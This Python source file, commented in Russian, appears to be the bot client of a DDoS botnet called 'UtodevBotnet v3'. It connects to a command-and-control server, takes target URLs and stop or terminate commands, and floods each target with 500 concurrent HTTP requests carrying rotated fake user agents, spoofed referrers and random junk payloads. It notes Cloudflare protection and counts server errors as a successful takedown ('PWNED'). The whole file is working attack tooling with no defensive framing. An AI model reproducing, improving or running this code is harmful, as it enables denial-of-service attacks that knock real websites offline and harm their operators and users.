#!/usr/bin/env python3

"""
UtodevBotnet v3

Основной модуль UtodevBotnet v3, который запускает HTTP-атаки.
Каждый процесс представляет собой отдельного бота в ботнете.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import logging
import platform
import random
import re
import socket
import string
import sys
import threading
from typing import TYPE_CHECKING, List, Optional, Tuple
from urllib.parse import urljoin

import aiohttp

try:  # When running directly.
    from enums import ClientCommands, ServerCommands, StatusCodes
except ImportError:  # When imported into launcher.
    from client.enums import ClientCommands, ServerCommands, StatusCodes

if TYPE_CHECKING:
    from asyncio import Task


class CustomFilter(logging.Filter):
    """
    Пользовательский фильтр для добавления IP и порта в логи.
    """

    def __init__(self) -> None:
        super().__init__()
        self._ip = threading.get_native_id()
        self._port = -1

    def update_address(self, address: Tuple[str, int]):
        """
        Обновить IP и порт.

        :param address: IP и порт.
        :type address: Tuple[str, int]
        """
        self._ip, self._port = address

    def filter(self, record: logging.LogRecord):
        """
        Фильтровать запись лога.

        :param record: Запись лога для фильтрации.
        :type record: logging.LogRecord
        :return: Следует ли фильтровать запись.
        :rtype: bool
        """
        record.ip = self._ip
        record.port = self._port
        return True


LOGGER = logging.getLogger("UtodevBotnet_Client")
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(
    logging.Formatter(
        fmt="[%(ip)s:%(port)d] %(message)s",
    )
)
LOGGER.addHandler(handler)
LOGGER.setLevel(logging.INFO)
FILTER = CustomFilter()
LOGGER.addFilter(FILTER)


class Missile:
    """
    Класс Missile, который будет атаковать цель HTTP-запросами.

    :param com: Класс Comms, используемый для связи с сервером.
    :type com: :class:`Comms`
    :param target: URL цели для атаки.
    :type target: str
    """
    def __init__(self, com: Comms, target: str):
        self.comms = com
        self.url = target
        self.host = urljoin(self.url, '/')
        self.method = "post"
        self.count = 0

    @staticmethod
    def generate_junk(size: int) -> str:
        """
        Генерировать случайные данные.

        :param size: Размер данных.
        :type size: int
        :return: Случайные данные.
        :rtype: str
        """
        return ''.join(
            random.choices(
                string.ascii_letters + string.digits,
                k=random.randint(3, size)
            )
        )

    async def _launch(self, session: aiohttp.ClientSession) -> int:
        """
        Запустить один HTTP-запрос и вернуть ответ.

        :param session: Сессия для использования в запросе.
        :type session: :class:`aiohttp.ClientSession`
        :return: Код статуса ответа.
        :rtype: int
        """
        self.count += 1
        FILTER.update_address(self.comms.address)
        LOGGER.info(
            "Запуск атаки № %d на %s",
            self.count, self.url.split('?')[0]
        )
        headers, payload = self._get_payload()
        try:
            async with session.request(
                method=self.method,
                url=self.url,
                headers=headers,
                json=payload
            ) as resp:
                status = resp.status
                reason = resp.reason
                if any([
                    resp.headers.get('server', '').lower() == "cloudflare",
                    status == 400
                ]):
                    FILTER.update_address(self.comms.address)
                    LOGGER.error('\nURL защищен от DDoS.')
                    self.comms.send(StatusCodes.ANTI_DDOS)
                elif status == 403:
                    FILTER.update_address(self.comms.address)
                    LOGGER.error(
                        '\nURL защищен. Попробуйте другой URL.'
                    )
                    self.comms.send(StatusCodes.FORBIDDEN)
                elif status == 404:
                    FILTER.update_address(self.comms.address)
                    LOGGER.error(
                        '\nURL не найден. Попробуйте другой URL.'
                    )
                elif status == 405:
                    self.method = "get"
                elif status == 429:
                    FILTER.update_address(self.comms.address)
                    LOGGER.warning(
                        '\nОбнаружено слишком много запросов. Замедляем...'
                    )
                    await asyncio.sleep(random.uniform(5.0, 7.5))
                elif status >= 500:
                    FILTER.update_address(self.comms.address)
                    LOGGER.info("Успешно выполнен DoS на %s!", self.url)
                    self.comms.send(StatusCodes.PWNED)
                elif status >= 400:
                    FILTER.update_address(self.comms.address)
                    LOGGER.warning(
                        "\nОбнаружен неизвестный код статуса.\n%d\n%s",
                        status, reason
                    )
            return status
        except aiohttp.ClientConnectorError:
            return StatusCodes.CONNECTION_FAILURE

    def _get_payload(self) -> Tuple[dict, dict]:
        """
        Генерировать полезную нагрузку для HTTP-запроса.

        :return: Заголовки и полезная нагрузка для HTTP-запроса.
        :rtype: Tuple[dict, dict]
        """
        ua_list = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
            'Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
            'Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
            'AppleWebKit/532.1 (KHTML, like Gecko)'
            'Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
            'Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        referrer_list = [
            'https://www.google.com/?q=',
            'https://www.usatoday.com/search/results?q=',
            'https://engadget.search.aol.com/search?q=',
            'https://cloudfare.com',
            'https://github.com',
            'https://en.wikipedia.org',
            'https://youtu.be',
            'https://mozilla.org',
            'https://microsoft.com',
            'https://wordpress.org',
            self.host
        ]
        headers = {
            'Cache-Control': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;'
            'q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Content-Encoding': 'deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Keep-Alive': str(random.randint(110, 120)),
            'User-Agent': random.choice(ua_list),
            'Referer': random.choice(referrer_list),
        }
        payload = {
            self.generate_junk(
                random.randint(5, 10)
            ): self.generate_junk(
                random.randint(500, 1000)
            )
        }
        return headers, payload

    async def attack(self, count: int):
        """
        Запустить атаку.

        :param count: Количество запросов для запуска.
        :type count: int
        """
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=0),
        ) as session:
            tasks = [
                asyncio.create_task(self._launch(session))
                for _ in range(count)
            ]
            status_list = set(await asyncio.gather(*tasks))
        if all(
            status < 500 and status not in (
                StatusCodes.FORBIDDEN,
                StatusCodes.NOT_FOUND,
                StatusCodes.CONNECTION_FAILURE
            )
            for status in status_list
        ):
            FILTER.update_address(self.comms.address)
            LOGGER.info(
                "Выполнено %d атак, "
                "но цель все еще цела...",
                self.count
            )
        with contextlib.suppress(ConnectionError):
            root_server = self.comms.root_server
            root_server.sendall(
                f"<{ClientCommands.READ_STATUS}>".encode()
            )
            root_server.sendall(
                b', '.join(
                    f"<{status}>".encode()
                    for status in status_list
                )
            )


class Comms:
    """
    Класс для связи с корневым сервером.

    :param root_ip: Адрес корневого сервера.
    :type root_ip: str
    :param root_port: Порт корневого сервера.
    :type root_port: Optional[int]
    """
    def __init__(
        self, root_ip: str,
        root_port: Optional[int] = 6666
    ):
        self.root_ip = root_ip
        self.root_port = root_port
        self._root_server = None
        self._tasks: List[Task] = []

    @property
    def root_server(self):
        """
        Получить сокет корневого сервера по указанным IP и порту.

        :param root_ip: IP корневого сервера.
        :type root_ip: str
        :param root_port: Порт корневого сервера.
        :type root_port: Optional[int]
        :return: Сокет корневого сервера.
        :rtype: socket.socket
        """
        if self._root_server is not None:
            return self._root_server
        root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        root.settimeout(5.0)  # Таймаут 5 секунд
        LOGGER.info("Попытка установить соединение с корневым сервером.")
        max_attempts = 10
        attempt = 0
        while attempt < max_attempts:
            try:
                root.connect((self.root_ip, self.root_port))
                break
            except (ConnectionError, socket.timeout, OSError) as e:
                attempt += 1
                if attempt < max_attempts:
                    LOGGER.warning(
                        "Попытка подключения %d/%d не удалась: %s. Повтор...",
                        attempt, max_attempts, e
                    )
                    import time
                    time.sleep(1)
                else:
                    LOGGER.error(
                        "Не удалось подключиться после %d попыток. Выход.",
                        max_attempts
                    )
                    sys.exit(1)
            except KeyboardInterrupt:
                sys.exit(0)
        self._root_server = root
        FILTER.update_address(self.address)
        LOGGER.info(
            "Подключено к корневому серверу @ [%s:%d]!",
            self.root_ip, self.root_port
        )
        root.sendall(f"<{ClientCommands.SEND_TARGET}>".encode())
        return root

    @property
    def address(self):
        """
        Получить адрес клиента.

        :return: Адрес клиента.
        :rtype: str
        """
        if self._root_server is None:
            return (threading.get_native_id(), -1)
        return self._root_server.getsockname()

    def close_server(self):
        """
        Закрыть сокет корневого сервера.
        """
        if self._root_server is not None:
            self._root_server.close()
            self._root_server = None

    async def monitor(self):
        """
        Мониторить корневой сервер на наличие команд.
        """
        root = self.root_server
        root.settimeout(30.0)  # Таймаут 30 секунд для команд
        while True:
            try:
                data = b''
                while True:
                    chunk = root.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:  # Макс размер 64KB
                        LOGGER.error("Сообщение команды слишком большое. Закрытие соединения.")
                        root.close()
                        sys.exit(1)
                    if b'\0' in chunk or len(chunk) < 4096:
                        break
                message = data.decode('utf-8', errors='ignore')
                if message == str(ServerCommands.TERMINATE):
                    for task in self._tasks:
                        task.cancel()
                    root.sendall(f"<{ClientCommands.KILLED}>".encode())
                    root.close()
                    sys.exit(0)
                elif message == str(ServerCommands.STOP):
                    for task in self._tasks:
                        task.cancel()
                    FILTER.update_address(self.address)
                    LOGGER.warning(
                        "Остановлено корневым сервером.\n"
                        "Переключение в режим ожидания."
                    )
                    root.sendall(f"<{ClientCommands.STANDBY}>".encode())
                elif message == str(ServerCommands.READ_TARGET):
                    # Улучшенное чтение данных с проверкой размера
                    target_data = b''
                    root.settimeout(5.0)
                    try:
                        while True:
                            chunk = root.recv(4096)
                            if not chunk:
                                break
                            target_data += chunk
                            if len(target_data) > 65536:  # Макс размер 64KB
                                LOGGER.error("URL цели слишком большой. Прерывание.")
                                break
                            if b'\0' in chunk or b'\n' in chunk:
                                break
                    except socket.timeout:
                        LOGGER.warning("Таймаут при получении цели.")
                        continue
                    except (ConnectionResetError, OSError) as e:
                        LOGGER.error(f"Ошибка при получении цели: {e}")
                        raise
                    
                    target = target_data.decode('utf-8', errors='ignore').strip()
                    if not target:
                        LOGGER.warning("Получена пустая цель. Пропуск.")
                        continue
                    missile = Missile(self, target)
                    task = asyncio.create_task(
                        missile.attack(500)
                    )
                    self._tasks.append(task)
                    await task
            except socket.timeout:
                FILTER.update_address(self.address)
                LOGGER.warning("Таймаут при ожидании команды. Повтор...")
                continue
            except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
                FILTER.update_address(self.address)
                LOGGER.warning(
                    "Соединение с корневым сервером разорвано: %s.\n"
                    "Переключение в режим ожидания.",
                    e
                )
                self._root_server = None
                root = self.root_server
            except KeyboardInterrupt:
                for task in self._tasks:
                    task.cancel()
                root.sendall(f"<{ClientCommands.KILLED}>".encode())
                root.close()
                sys.exit(0)

    def send(self, status_code: StatusCodes):
        """
        Отправить код статуса корневому серверу.

        :param status_code: Код статуса для отправки.
        :type status_code: StatusCodes
        """
        with contextlib.suppress(ConnectionError):
            for msg in [ClientCommands.READ_STATUS, status_code]:
                self._root_server.sendall(f"<{msg}>".encode())


def modify_parser(parser: argparse.ArgumentParser):
    """
    Полезно для предоставления модификации парсера внешним модулям.

    :param parser: Парсер для модификации.
    :type parser: argparse.ArgumentParser
    """
    def ip_address(arg: argparse.Action):
        """
        Проверить IP-адрес.

        :param arg: Аргумент для проверки.
        :type arg: argparse.Action
        :return: Проверенный аргумент.
        :rtype: argparse.Action
        """
        ip_pattern = re.compile(
            r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
            r"|^localhost$"
        )
        if not ip_pattern.match(arg):
            raise argparse.ArgumentTypeError(
                f"{arg} не является действительным IP-адресом."
            )
        return arg
    parser.add_argument(
        '-r', '--root_ip',
        help='IPv4-адрес, где запущен сервер UtodevBotnet.',
        default="localhost",
        type=ip_address
    )
    parser.add_argument(
        '-p', '--root_port',
        help='Порт, где запущен сервер UtodevBotnet.',
        default=6666
    )
    parser.add_argument(
        '-s', '--stealth',
        help='Скрытый режим.',
        action='store_true',
    )


if __name__ == "__main__":
    argparser = argparse.ArgumentParser()
    modify_parser(argparser)
    args = argparser.parse_args()

    comms = Comms(args.root_ip, args.root_port)

    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(
            asyncio.WindowsSelectorEventLoopPolicy()
        )
    asyncio.run(comms.monitor())
